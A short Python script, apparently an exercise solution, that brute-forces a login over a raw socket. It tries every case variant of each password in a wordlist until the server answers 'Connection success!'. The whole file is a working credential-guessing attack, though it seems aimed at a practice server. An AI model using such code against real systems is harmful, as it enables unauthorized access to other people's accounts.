import sys
import socket
import itertools


class PasswordHacker:
    def __init__(self):
        self.address = (sys.argv[1], int(sys.argv[2]))
        self.send_receive()

    def send_receive(self):

        with socket.socket() as c:
            c.connect(self.address)
            with open('passwords.txt', 'r', encoding='utf-8') as f:
                for pw in f:
                    for password in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in pw))):
                        c.send(password.strip().encode())
                        print(password.strip())
                        if c.recv(1024) == b'Connection success!':
                            print(password.strip())
                            exit()


if __name__ == '__main__':
    PasswordHacker()
